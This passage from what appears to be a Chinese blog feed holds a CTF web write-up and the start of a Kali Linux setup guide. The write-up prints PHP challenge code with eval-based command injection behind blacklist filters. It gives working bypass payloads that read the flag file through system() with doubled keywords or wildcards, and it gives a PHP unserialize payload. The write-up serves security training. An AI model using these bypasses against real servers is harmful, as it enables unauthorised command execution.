class="string">&quot;Nzc2NTZjNjU2MzZmNmQ2NTVmNzQ2ZjVmNzI2ZjY5NzMyMQ==&quot;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;authentication failed!!&quot;</span>);</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$nameFunction</span> = <span class="title function_ invoke__">htmlspecialchars</span>(@<span class="variable">$_POST</span>[<span class="string">&quot;function&quot;</span>]); <span class="keyword">unset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;function&quot;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$nameFunction</span>) <span class="variable">$nameFunction</span> = <span class="title function_ invoke__">htmlspecialchars</span>(@<span class="variable">$_POST</span>[<span class="string">&quot;action&quot;</span>]); <span class="keyword">unset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;action&quot;</span>]);</span><br><span class="line">    <span class="variable">$nameFunction</span> = <span class="title function_ invoke__">waf</span>(<span class="variable">$nameFunction</span>);</span><br><span class="line">    <span class="variable">$nameFunction</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;/&quot;</span>,<span class="variable">$nameFunction</span>);</span><br><span class="line">    <span class="variable">$nameFunction</span> = <span class="variable">$nameFunction</span>[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$nameFunction</span>)&#123;</span><br><span class="line">        <span class="variable">$params</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="title function_ invoke__">forEach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$item</span>)&#123;</span><br><span class="line">            <span class="variable">$item</span> = <span class="title function_ invoke__">waf</span>(<span class="variable">$item</span>);</span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$params</span>, <span class="variable">$item</span>); <span class="keyword">unset</span>(<span class="variable">$_POST</span>[<span class="variable">$key</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$base64</span> = <span class="literal">false</span>; <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_BASE64&quot;</span>]))&#123; <span class="variable">$base64</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_BASE64&quot;</span>] === <span class="string">&#x27;true&#x27;</span> ? <span class="literal">true</span> : <span class="literal">false</span>; &#125;</span><br><span class="line">        <span class="variable">$params</span> = <span class="title function_ invoke__">join</span>(<span class="string">&quot;&#x27;,&#x27;&quot;</span>, <span class="variable">$params</span>); <span class="variable">$eval</span> = <span class="variable">$nameFunction</span>.<span class="string">&quot;(&#x27;&quot;</span>.<span class="variable">$params</span>.<span class="string">&quot;&#x27;)&quot;</span>; <span class="variable">$return</span> = <span class="keyword">eval</span>(<span class="string">&#x27;return &#x27;</span>.<span class="variable">$eval</span>.<span class="string">&quot;;&quot;</span>); <span class="keyword">echo</span> <span class="title function_ invoke__">jsonEncode</span>(<span class="variable">$return</span>, <span class="variable">$base64</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonEncode</span>(<span class="params"><span class="variable">$value</span>, <span class="variable">$base64_encode</span> = <span class="literal">true</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$value</span> = <span class="title function_ invoke__">json_encode</span>(<span class="variable">$value</span>, JSON_PRETTY_PRINT);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$base64_encode</span>) <span class="variable">$value</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$value</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$word</span>) &#123;</span><br><span class="line">        <span class="variable">$input</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$word</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$input</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先解决</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (@<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_KEY&#x27;</span>] !== <span class="string">&quot;Nzc2NTZjNjU2MzZmNmQ2NTVmNzQ2ZjVmNzI2ZjY5NzMyMQ==&quot;</span>)</span><br></pre></td></tr></table></figure><p>在http加入请求头<code>key: Nzc2NTZjNjU2MzZmNmQ2NTVmNzQ2ZjVmNzI2ZjY5NzMyMQ==</code>(这一串最后解码后发现是<code>welecome_to_rois!</code> 小彩蛋？)。</p><p>然后读代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$nameFunction</span> = <span class="title function_ invoke__">htmlspecialchars</span>(@<span class="variable">$_POST</span>[<span class="string">&quot;function&quot;</span>]); <span class="keyword">unset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;function&quot;</span>]);</span><br><span class="line">   <span class="keyword">if</span>(!<span class="variable">$nameFunction</span>) <span class="variable">$nameFunction</span> = <span class="title function_ invoke__">htmlspecialchars</span>(@<span class="variable">$_POST</span>[<span class="string">&quot;action&quot;</span>]); <span class="keyword">unset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;action&quot;</span>]);</span><br><span class="line">   <span class="variable">$nameFunction</span> = <span class="title function_ invoke__">waf</span>(<span class="variable">$nameFunction</span>);</span><br><span class="line">   <span class="variable">$nameFunction</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;/&quot;</span>,<span class="variable">$nameFunction</span>);</span><br><span class="line">   <span class="variable">$nameFunction</span> = <span class="variable">$nameFunction</span>[<span class="number">1</span>];</span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$nameFunction</span>)&#123;</span><br><span class="line">       <span class="variable">$params</span> = <span class="keyword">array</span>();</span><br><span class="line">       <span class="title function_ invoke__">forEach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$item</span>)&#123;</span><br><span class="line">           <span class="variable">$item</span> = <span class="title function_ invoke__">waf</span>(<span class="variable">$item</span>);</span><br><span class="line">           <span class="title function_ invoke__">array_push</span>(<span class="variable">$params</span>, <span class="variable">$item</span>); <span class="keyword">unset</span>(<span class="variable">$_POST</span>[<span class="variable">$key</span>]);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="variable">$base64</span> = <span class="literal">false</span>; <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_BASE64&quot;</span>]))&#123; <span class="variable">$base64</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_BASE64&quot;</span>] === <span class="string">&#x27;true&#x27;</span> ? <span class="literal">true</span> : <span class="literal">false</span>; &#125;</span><br><span class="line">       <span class="variable">$params</span> = <span class="title function_ invoke__">join</span>(<span class="string">&quot;&#x27;,&#x27;&quot;</span>, <span class="variable">$params</span>); <span class="variable">$eval</span> = <span class="variable">$nameFunction</span>.<span class="string">&quot;(&#x27;&quot;</span>.<span class="variable">$params</span>.<span class="string">&quot;&#x27;)&quot;</span>; <span class="variable">$return</span> = <span class="keyword">eval</span>(<span class="string">&#x27;return &#x27;</span>.<span class="variable">$eval</span>.<span class="string">&quot;;&quot;</span>); <span class="keyword">echo</span> <span class="title function_ invoke__">jsonEncode</span>(<span class="variable">$return</span>, <span class="variable">$base64</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>最后<code>eval</code>函数执行的是<code>$_POST[&quot;action&quot;]</code>中从左到右第一个<code>/</code>后的字段，并最后拼接字段<code>$eval</code>形成这样一个结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">函数名(&#x27;参数名&#x27;);</span><br></pre></td></tr></table></figure><p>此时函数就可以考虑利用<code>system()</code>等函数读取根目录下的flag文件，这个过程中就会遇到一个waf函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function waf($input) &#123;</span><br><span class="line">    $blacklist = [&#x27;system&#x27;, &#x27;exec&#x27;, &#x27;flag&#x27;];</span><br><span class="line"></span><br><span class="line">    foreach ($blacklist as $word) &#123;</span><br><span class="line">        $input = str_replace($word, &#x27;&#x27;, $input);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return $input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对<code>&#39;system&#39;, &#39;exec&#39;, &#39;flag&#39;</code>三个敏感词进行替换，这种可以直接进行双写绕过即可（即<code>system</code>写成<code>syssystemtem</code>）</p><p>最后的<code>playroad</code>可以写成<code>action=syssystemtem&amp;wells=cat /flflagag</code>,其中第二个名称可以随便设立</p><h3 id="ez-rce-with-full-waf"><a href="#ez-rce-with-full-waf" class="headerlink" title="ez_rce_with_full_waf?"></a>ez_rce_with_full_waf?</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (@<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_KEY&#x27;</span>] !== <span class="string">&quot;Nzc2NTZjNjU2MzZmNmQ2NTVmNzQ2ZjVmNzI2ZjY5NzMyMQ==&quot;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;authentication failed!!&quot;</span>);</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$nameFunction</span> = <span class="title function_ invoke__">htmlspecialchars</span>(@<span class="variable">$_POST</span>[<span class="string">&quot;function&quot;</span>]); <span class="keyword">unset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;function&quot;</span>]);</span><br><span class="line">    <span class="variable">$nameFunction</span> = <span class="title function_ invoke__">waf</span>(<span class="variable">$nameFunction</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$nameFunction</span>) <span class="variable">$nameFunction</span> = <span class="title function_ invoke__">htmlspecialchars</span>(@<span class="variable">$_POST</span>[<span class="string">&quot;action&quot;</span>]); <span class="keyword">unset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;action&quot;</span>]);</span><br><span class="line">    <span class="variable">$nameFunction</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;/&quot;</span>,<span class="variable">$nameFunction</span>);</span><br><span class="line">    <span class="variable">$nameFunction</span> = <span class="variable">$nameFunction</span>[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$nameFunction</span>)&#123;</span><br><span class="line">        <span class="variable">$params</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="title function_ invoke__">forEach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$item</span>)&#123;</span><br><span class="line">            <span class="variable">$item</span> = <span class="title function_ invoke__">waf</span>(<span class="variable">$item</span>);</span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$params</span>, <span class="variable">$item</span>); <span class="keyword">unset</span>(<span class="variable">$_POST</span>[<span class="variable">$key</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$base64</span> = <span class="literal">false</span>; <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_BASE64&quot;</span>]))&#123; <span class="variable">$base64</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_BASE64&quot;</span>] === <span class="string">&#x27;true&#x27;</span> ? <span class="literal">true</span> : <span class="literal">false</span>; &#125;</span><br><span class="line">        <span class="variable">$params</span> = <span class="title function_ invoke__">join</span>(<span class="string">&quot;&#x27;,&#x27;&quot;</span>, <span class="variable">$params</span>); <span class="variable">$eval</span> = <span class="variable">$nameFunction</span>.<span class="string">&quot;(&#x27;&quot;</span>.<span class="variable">$params</span>.<span class="string">&quot;&#x27;)&quot;</span>; <span class="variable">$return</span> = <span class="keyword">eval</span>(<span class="string">&#x27;return &#x27;</span>.<span class="variable">$eval</span>.<span class="string">&quot;;&quot;</span>); <span class="keyword">echo</span> <span class="title function_ invoke__">jsonEncode</span>(<span class="variable">$return</span>, <span class="variable">$base64</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonEncode</span>(<span class="params"><span class="variable">$value</span>, <span class="variable">$base64_encode</span> = <span class="literal">true</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$value</span> = <span class="title function_ invoke__">json_encode</span>(<span class="variable">$value</span>, JSON_PRETTY_PRINT);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$base64_encode</span>) <span class="variable">$value</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$value</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;flag&#x27;</span> ,<span class="string">&#x27;`&#x27;</span> ,<span class="string">&#x27;eval&#x27;</span> ,<span class="string">&#x27;call&#x27;</span> ,<span class="string">&#x27;$&#x27;</span> ,<span class="string">&#x27;php&#x27;</span> ,<span class="string">&#x27;require&#x27;</span> , <span class="string">&#x27;_&#x27;</span> , <span class="string">&#x27;file&#x27;</span> ,<span class="string">&#x27;show&#x27;</span> , <span class="string">&#x27;include&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span> , <span class="string">&#x27;&quot;&#x27;</span> , <span class="string">&#x27;.&#x27;</span>  , <span class="string">&#x27;&lt;&#x27;</span> , <span class="string">&#x27;&gt;&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$word</span>) &#123;</span><br><span class="line">        <span class="variable">$input</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$word</span>, <span class="string">&#x27;hack!&#x27;</span>, <span class="variable">$input</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与上一题不同的是本题的waf()函数，限制更多且不能进行双写绕过(敏感词会变成<code>hack！</code>，而不是去除)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;flag&#x27;</span> ,<span class="string">&#x27;`&#x27;</span> ,<span class="string">&#x27;eval&#x27;</span> ,<span class="string">&#x27;call&#x27;</span> ,<span class="string">&#x27;$&#x27;</span> ,<span class="string">&#x27;php&#x27;</span> ,<span class="string">&#x27;require&#x27;</span> , <span class="string">&#x27;_&#x27;</span> , <span class="string">&#x27;file&#x27;</span> ,<span class="string">&#x27;show&#x27;</span> , <span class="string">&#x27;include&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span> , <span class="string">&#x27;&quot;&#x27;</span> , <span class="string">&#x27;.&#x27;</span>  , <span class="string">&#x27;&lt;&#x27;</span> , <span class="string">&#x27;&gt;&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$word</span>) &#123;</span><br><span class="line">        <span class="variable">$input</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$word</span>, <span class="string">&#x27;hack!&#x27;</span>, <span class="variable">$input</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果直接使用<code>$_POST[&quot;function&quot;]</code>可以考虑用其他的执行系统命令的函数<code>shell_exec（），passthru（）， pcntl_exec（）， popen（）， proc_open（）</code>，但在代码中，有一处漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!$nameFunction) $nameFunction = htmlspecialchars(@$_POST[&quot;action&quot;]); unset($_POST[&quot;action&quot;]);</span><br></pre></td></tr></table></figure><p>此时的<code>$nameFunction</code>，没有进行任何的waf过滤，因此可以不设置<code>$_POST[&quot;function&quot;]</code>参数而使用<code>$_POST[&quot;action&quot;]</code>，对于<code>flag</code>这个词的绕过，可以使用<code>linux</code>系统的通配符如<code>？</code>、<code>[]</code>，将<code>flag</code>写成<code>fla?</code></p><p>最后的<code>playroad</code>可以写成<code>action=system&amp;wells=cat /fla?</code>,其中第二个名称可以随便设立</p><h3 id="unserialize-1"><a href="#unserialize-1" class="headerlink" title="unserialize-1"></a>unserialize-1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;ROIS&#123;test&#125;&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;password!=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;nice&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>]);</span><br></pre></td></tr></table></figure><p><code>unserialize()</code>函数进行反序列化的函数（序列化与反序列化概念：<a href="https://zhuanlan.zhihu.com/p/316200445">一文搞懂序列化与反序列化</a>）</p><p>然后有关于<code>__wakeup()</code>和<code>__toString()</code>的两个魔术方法</p><p><code>__wakeup()</code>在反序列的过程中会自动调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;password!=<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果此反序列化后的对象的<code>password</code>变量不为空，会打变量<code>password</code>反之打印<code>name</code>变量</p><p><code>__toString()</code>在将对象被作为字符串中过程中会自动调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public function __toString() &#123;</span><br><span class="line">    global $flag;</span><br><span class="line">    echo $flag;</span><br><span class="line">    return &quot;nice&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>触发<code>__toString()</code>就可以打印出flag，所以本题的关键就是将对象被作为字符串中过程中会自动调用，而唯一有可能的就是反序列化过程中自动触发的<code>echo</code></p><p>联想出将这个对象的<code>name变量</code>的值也是对象，<code>password变量</code>的值为空即可，即</p><p>使用<code>s:45:&quot;O:4:&quot;Name&quot;:2:&#123;s:4:&quot;name&quot;;N;s:8:&quot;password&quot;;N;&#125;&quot;</code>即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;WEEK1&quot;&gt;&lt;a href=&quot;#WEEK1&quot; class=&quot;headerlink&quot; title=&quot;WEEK1&quot;&gt;&lt;/a&gt;WEEK1&lt;/h1&gt;&lt;h2 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/</summary>
      
    
    
    
    <category term="CTF" scheme="https://we11s.github.io/categories/CTF/"/>
    
    
    <category term="CTF-WriteUp" scheme="https://we11s.github.io/tags/CTF-WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>Kali优化</title>
    <link href="https://we11s.github.io/posts/1455897523/"/>
    <id>https://we11s.github.io/posts/1455897523/</id>
    <published>2024-01-11T15:22:44.000Z</published>
    <updated>2024-03-12T16:33:15.011Z</updated>
    
    <content type="html"><![CDATA[<p><strong>kali解压打开默认密码为：kali</strong></p><h1 id="设置中文"><a href="#设置中文" class="headerlink" title="设置中文"></a><strong>设置中文</strong></h1><p>打开Terminal，输入命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg-reconfigure locales</span><br></pre></td></tr></table></figure><p>进入后使用键盘的↑+↓←，到最底部，找到 <code>[ ] zh_CN.UTF-8 UTF-8</code>  ，按空格键选中，再按回车进入下一个页面，再选中 <code>zh_CN.UTF-8</code>作为默认语言，后回车</p><p>等待下载结束后重启即可  </p><h1 id="换源"><a href="#换源" class="headerlink" title="换源"></a><strong>换源</strong></h1><p>因为官方源都是的速度慢，所以选择换国内源</p><p>打开Terminal，输入命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>可选的国内源</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#阿里云源</span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">#中科大源</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">#清华大学源</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.tuna.tsinghua.edu.cn//kali kali-rolling main non-free contrib</span><br><span class="line">#浙大源</span><br><span class="line">deb http://mirrors.zju.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.zju.edu.cn/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure><p>不懂vim语法的按以下步骤来</p><ol><li><p>全选删除原本的内容</p><p>​按<strong>esc键</strong>后，先按 <strong>g  g</strong>（到达顶部），然后再按 <strong>d  G</strong>(区分大小写！！！)</p></li><li><p>复制以上内容，右键粘贴</p></li><li><p>保存退出</p><p>​按<strong>esc键</strong>后，同时按住<strong>shift</strong>键和英文**:**键，再输入wq</p></li></ol><h1 id="系统优化"><a href="#系统优化" class="headerlink" title="系统优化"></a><strong>系统优化</strong></h1><h2 id="1-设置root账户密码"><a href="#1-设置root账户密码" class="headerlink" title="1.设置root账户密码"></a>1.设置root账户密码</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure><h2 id="2-设置禁止休眠"><a href="#2-设置禁止休眠" class="headerlink" title="2.设置禁止休眠"></a>2.设置禁止休眠</h2><ul><li>打开左上角kali图标</li><li>点击<code>settings(设置)</code></li><li>点击进入<code>power Manger(电源管理器)</code></li><li>在<code>Power Manager</code> 选择—&gt; <code>display(显示)</code><br>  把使用电池和插入电源下的依次把<code>Blank after、Put to sleep after和Switch off after</code> 全部设置成为 <code>Never</code></li></ul><h2 id="3-软件数据库更新："><a href="#3-软件数据库更新：" class="headerlink" title="3.软件数据库更新："></a>3.软件数据库更新：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure><h2 id="4-软件更新："><a href="#4-软件更新：" class="headerlink" title="4.软件更新："></a>4.软件更新：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get upgrade</span><br></pre></td></tr></table></figure><h2 id="5-系统更新："><a href="#5-系统更新：" class="headerlink" title="5.系统更新："></a>5.系统更新：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get dist-upgrade</span><br></pre></td></tr></table></figure><h1 id="安装中文输入法"><a href="#安装中文输入法" 